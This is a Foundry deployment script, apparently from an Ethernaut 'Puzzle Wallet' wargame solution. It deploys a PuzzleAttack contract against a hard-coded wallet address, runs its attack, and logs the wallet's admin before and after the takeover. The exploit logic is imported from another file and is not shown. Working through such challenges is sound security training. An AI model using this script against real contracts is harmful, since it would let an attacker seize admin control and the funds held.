// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {PuzzleAttack} from "../src/PuzzleAttack.sol";

interface IPuzzleWallet {
    function admin() external view returns (address);
}

contract PuzzleScript is Script {

    // IPuzzleWallet wallet = IPuzzleWallet(0x7E069Cb68CE876D435b422652f86462F4A276145);
    // PuzzleAttack attack = PuzzleAttack(0x7E069Cb68CE876D435b422652f86462F4A276145);
    // address myAddress = 0x5134FCA2Ce708AEf8672ffB6561288ee81E30543;



    address private immutable puzzleWallet =
        0x52B3856d571E9375a9286191F095a8cAD20221E3;

    function run() external {
        vm.startBroadcast();

        console2.log("Current admin: ", IPuzzleWallet(puzzleWallet).admin());

        PuzzleAttack attack = new PuzzleAttack{value: 0.001 ether}(puzzleWallet);
        attack.attack();

        console2.log("New admin: ", IPuzzleWallet(puzzleWallet).admin());

        vm.stopBroadcast();
    }

}
